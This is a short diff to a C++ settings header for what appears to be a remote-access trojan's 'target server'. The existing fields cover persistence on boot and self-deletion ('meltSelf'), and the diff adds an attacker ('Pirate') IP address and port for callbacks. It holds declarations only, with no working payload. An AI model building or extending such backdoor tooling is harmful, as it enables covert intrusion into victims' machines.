@@ -18,5 +18,9 @@ public:
     static bool startOnNextBoot;
     static bool meltSelf;				//specifies whether the installed clone should delete the initial file
 
+    static const char * adresseipPirate;
+    static unsigned short portPirate;
+
+
 };
 #endif //SERVEUR___CIBLE_SETTINGS_H
